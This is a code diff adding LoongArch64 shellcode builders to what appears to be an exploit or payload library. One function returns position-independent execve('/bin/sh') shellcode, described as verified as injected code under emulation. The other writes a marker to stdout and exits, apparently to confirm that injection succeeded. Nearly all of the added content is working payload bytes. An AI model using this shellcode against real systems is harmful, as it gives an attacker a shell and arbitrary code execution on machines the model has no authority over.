@@ -406,6 +406,41 @@ def write_marker_ppc32(marker: bytes) -> bytes:
     ) + marker
 
 
+def execve_binsh_loongarch64() -> bytes:
+    """LoongArch64 execve("/bin/sh", NULL, NULL) -- 20 bytes of code + "/bin/sh\\0", position-
+    independent (`pcaddi $a0, 5` points a0 at the string appended after the code). a1=a2=0, a7=221
+    (__NR_execve), `syscall 0`. 4-byte little-endian instructions. Verified by running the bytes as
+    injected code under qemu-loongarch64: a real /bin/sh spawns (the guest execve is relayed to the
+    host, and /bin/sh is a host binary the kernel then runs natively)."""
+    return bytes.fromhex(
+        "a4000018"                       # pcaddi $a0, 5        ; a0 -> "/bin/sh" (+20 bytes)
+        "05001500"                       # move   $a1, $zero    ; argv = NULL
+        "06001500"                       # move   $a2, $zero    ; envp = NULL
+        "0b748303"                       # li.w   $a7, 221      ; __NR_execve
+        "00002b00"                       # syscall 0
+    ) + b"/bin/sh\x00"
+
+
+def write_marker_loongarch64(marker: bytes) -> bytes:
+    """LoongArch64 write(1, msg, len); exit(0). Position-independent (`pcaddi $a1, 7` points a1 at the
+    marker appended after the 32-byte code); the length is patched into the `ori $a2, $zero, len`
+    immediate (bits [21:10]). 4-byte little-endian instructions. Verified as injected code under
+    qemu-loongarch64."""
+    n = len(marker) & 0xFFF
+    code = bytearray(bytes.fromhex(
+        "04048003"                       # li.w   $a0, 1        ; fd = stdout
+        "e5000018"                       # pcaddi $a1, 7        ; a1 -> marker (+32 bytes)
+        "06008003"                       # ori    $a2, $zero, 0 ; len (PATCHED below)
+        "0b008103"                       # li.w   $a7, 64       ; __NR_write
+        "00002b00"                       # syscall 0
+        "04001500"                       # move   $a0, $zero    ; exit code 0
+        "0b748103"                       # li.w   $a7, 93       ; __NR_exit
+        "00002b00"                       # syscall 0
+    ))
+    code[8:12] = (0x03800006 | (n << 10)).to_bytes(4, "little")   # ori $a2, $zero, n
+    return bytes(code) + marker
+
+
 def write_marker_aarch64(marker: bytes) -> bytes:
     """AArch64 write(1, marker, len); exit(93). Position-independent: `adr x1, marker` addresses the
     marker bytes appended after the fixed 7-instruction (28-byte) code, PC-relative, so the stub
